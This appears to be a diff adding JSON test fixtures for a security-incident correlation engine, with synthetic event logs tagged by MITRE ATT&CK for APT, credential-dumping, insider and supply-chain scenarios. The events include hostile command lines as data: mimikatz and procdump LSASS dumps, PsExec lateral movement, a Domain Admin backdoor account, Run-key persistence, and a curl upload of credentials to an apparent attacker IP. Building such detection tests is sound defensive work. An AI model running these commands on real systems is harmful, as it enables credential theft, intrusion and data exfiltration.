+          "_mitreTechnique": "T1003.001",
+          "_mitreTactic": "credential-access",
+          "_comment": "Mimikatz credential dump"
+        },
+        {
+          "event_type": "lateral_movement",
+          "computer": "DC-01",
+          "user": "analyst",
+          "srcIp": "10.1.1.201",
+          "process": "psexec.exe",
+          "commandLine": "psexec \\\\DC-01 -u analyst cmd.exe",
+          "timestamp": "2026-05-02T12:56:00.000Z",
+          "_mitreTechnique": "T1021.002",
+          "_mitreTactic": "lateral-movement",
+          "_comment": "PsExec to Domain Controller with dumped credentials"
+        },
+        {
+          "event_type": "persistence",
+          "computer": "DC-01",
+          "user": "analyst",
+          "process": "net.exe",
+          "commandLine": "net user aptsvc Sup3r$ecret /add && net group \"Domain Admins\" aptsvc /add",
+          "timestamp": "2026-05-02T12:58:00.000Z",
+          "_mitreTechnique": "T1136.001",
+          "_mitreTactic": "persistence",
+          "_comment": "Domain Admin account created for persistent access"
+        }
+      ]
+    },
+
+    "credential_dump": {
+      "_comment": "Credential dumping campaign: LSASS memory dump, file staging, exfiltration to attacker C2. Single host SRV-3. Must produce exactly 1 incident.",
+      "events": [
+        {
+          "event_type": "discovery",
+          "computer": "SRV-3",
+          "user": "john.doe",
+          "process": "cmd.exe",
+          "commandLine": "tasklist /fi \"imagename eq lsass.exe\" && whoami /priv",
+          "timestamp": "2026-05-02T13:42:00.000Z",
+          "_mitreTechnique": "T1057",
+          "_mitreTactic": "discovery",
+          "_comment": "LSASS process discovery before dump"
+        },
+        {
+          "event_type": "credential_access",
+          "computer": "SRV-3",
+          "user": "john.doe",
+          "process": "procdump64.exe",
+          "commandLine": "procdump64.exe -ma lsass.exe C:\\Temp\\lsass.dmp",
+          "timestamp": "2026-05-02T13:43:00.000Z",
+          "_mitreTechnique": "T1003.001",
+          "_mitreTactic": "credential-access",
+          "_comment": "LSASS memory dump via procdump"
+        },
+        {
+          "event_type": "file_access",
+          "computer": "SRV-3",
+          "user": "john.doe",
+          "file": "C:\\Temp\\lsass.dmp",
+          "timestamp": "2026-05-02T13:43:30.000Z",
+          "_mitreTechnique": "T1003.001",
+          "_mitreTactic": "credential-access",
+          "_comment": "LSASS dump file staged"
+        },
+        {
+          "event_type": "process_creation",
+          "computer": "SRV-3",
+          "user": "john.doe",
+          "process": "powershell.exe",
+          "commandLine": "powershell -enc SQBFAFgA",
+          "timestamp": "2026-05-02T13:44:00.000Z",
+          "_mitreTechnique": "T1059.001",
+          "_mitreTactic": "execution",
+          "_comment": "PowerShell to process dumped credentials"
+        },
+        {
+          "event_type": "exfiltration",
+          "computer": "SRV-3",
+          "user": "john.doe",
+          "process": "curl.exe",
+          "destIp": "45.142.212.100",
+          "destPort": 443,
+          "bytesSent": 52428800,
+          "commandLine": "curl -T C:\\Temp\\lsass.dmp https://45.142.212.100/upload",
+          "timestamp": "2026-05-02T13:45:00.000Z",
+          "_mitreTechnique": "T1041",
+          "_mitreTactic": "exfiltration",
+          "_comment": "LSASS dump exfiltrated to attacker C2"
+        }
+      ]
+    },
+
+    "insider": {
+      "_comment": "Insider threat: legitimate user accesses sensitive financial data after hours, archives and exfiltrates. Single host CORP-FS, user j.smith. Must produce exactly 1 incident.",
+      "events": [
+        {
+          "event_type": "auth_success",
+          "computer": "CORP-FS",
+          "user": "j.smith",
+          "srcIp": "192.168.5.20",
+          "status": "success",
+          "timestamp": "2026-05-02T22:30:00.000Z",
+          "_mitreTechnique": "T1078",
+          "_mitreTactic": "initial-access",
+          "_comment": "After-hours login to file server"
+        },
+        {
+          "event_type": "insider_activity",
+          "computer": "CORP-FS",
+          "user": "j.smith",
+          "file": "C:\\Finance\\salary_data_2026.xlsx",
+          "bytes_read": 2097152,
+          "timestamp": "2026-05-02T22:31:00.000Z",
+          "_mitreTechnique": "T1005",
+          "_mitreTactic": "collection",
+          "_comment": "Sensitive HR/Finance file accessed after hours"
+        },
+        {
+          "event_type": "file_access",
+          "computer": "CORP-FS",
+          "user": "j.smith",
+          "file": "C:\\Confidential\\M&A_Target_2026.docx",
+          "timestamp": "2026-05-02T22:32:00.000Z",
+          "_mitreTechnique": "T1005",
+          "_mitreTactic": "collection",
+          "_comment": "Confidential M&A document accessed"
+        },
+        {
+          "event_type": "process_creation",
+          "computer": "CORP-FS",
+          "user": "j.smith",
+          "process": "7z.exe",
+          "commandLine": "7z.exe a -tzip -p C:\\Temp\\export.zip C:\\Finance\\* C:\\Confidential\\*",
+          "timestamp": "2026-05-02T22:33:00.000Z",
+          "_mitreTechnique": "T1560.001",
+          "_mitreTactic": "collection",
+          "_comment": "Data archived into password-protected ZIP"
+        },
+        {
+          "event_type": "exfiltration",
+          "computer": "CORP-FS",
+          "user": "j.smith",
+          "process": "onedrive.exe",
+          "destIp": "13.107.42.14",
+          "destPort": 443,
+          "bytesSent": 157286400,
+          "timestamp": "2026-05-02T22:35:00.000Z",
+          "_mitreTechnique": "T1567.002",
+          "_mitreTactic": "exfiltration",
+          "_comment": "150MB archive uploaded to personal cloud storage"
+        }
+      ]
+    },
+
+    "supply_chain": {
+      "_comment": "Supply chain attack: malicious package installs backdoor → LOLBAS execution → C2 → lateral movement to production. Two hosts. Must produce exactly 1 cross-host incident.",
+      "events": [
+        {
+          "event_type": "supply_chain_event",
+          "computer": "BUILD-1",
+          "user": "build_agent",
+          "process": "npm.exe",
+          "commandLine": "npm install lodash-utils-extra@3.1.2",
+          "timestamp": "2026-05-02T08:00:00.000Z",
+          "_mitreTechnique": "T1195.002",
+          "_mitreTactic": "initial-access",
+          "_comment": "Malicious npm package installed via supply chain"
+        },
+        {
+          "event_type": "process_creation",
+          "computer": "BUILD-1",
+          "user": "build_agent",
+          "process": "rundll32.exe",
+          "parentProcess": "node.exe",
+          "commandLine": "rundll32.exe C:\\Users\\build_agent\\AppData\\npm\\payload.dll,Start",
+          "timestamp": "2026-05-02T08:01:00.000Z",
+          "_mitreTechnique": "T1218.011",
+          "_mitreTactic": "defense-evasion",
+          "_comment": "LOLBAS rundll32 used to execute malicious DLL"
+        },
+        {
+          "event_type": "persistence",
+          "computer": "BUILD-1",
+          "user": "build_agent",
+          "commandLine": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SvcHost /d C:\\Users\\build_agent\\AppData\\payload.exe /f",
+          "timestamp": "2026-05-02T08:02:00.000Z",
+          "_mitreTechnique": "T1547.001",
+          "_mitreTactic": "persistence",
+          "_comment": "HKLM Run key persistence established"
+        },
+        {
+          "event_type": "network_connection",
+          "computer": "BUILD-1",
+          "user": "build_agent",
+          "process": "rundll32.exe",
+          "destIp": "185.4.5.6",
+          "destPort": 8443,
+          "bytesSent": 512,
+          "timestamp": "2026-05-02T08:03:00.000Z",
+          "_mitreTechnique": "T1071.001",
+          "_mitreTactic": "command-and-control",
+          "_comment": "C2 beacon from build pipeline"
+        },
+        {
+          "event_type": "lateral_movement",
+          "computer": "PROD-1",
+          "user": "build_agent",
+          "srcIp": "10.0.1.5",
+          "process": "psexec.exe",
+          "commandLine": "psexec \\\\PROD-1 -u build_agent -s cmd.exe",
+          "timestamp": "2026-05-02T08:10:00.000Z",
+          "_mitreTechnique": "T1021.002",
+          "_mitreTactic": "lateral-movement",
+          "_comment": "Lateral movement from build system to production"
+        },
+        {
+          "event_type": "credential_access",
+          "computer": "PROD-1",
+          "user": "build_agent",
+          "process": "mimikatz.exe",
+          "commandLine": "mimikatz privilege::debug sekurlsa::logonpasswords",
+          "timestamp": "2026-05-02T08:12:00.000Z",
+          "_mitreTechnique": "T1003.001",
+          "_mitreTactic": "credential-access",
+          "_comment": "Credential harvest on production server"
+        }
+      ]
+    }
   }
 }
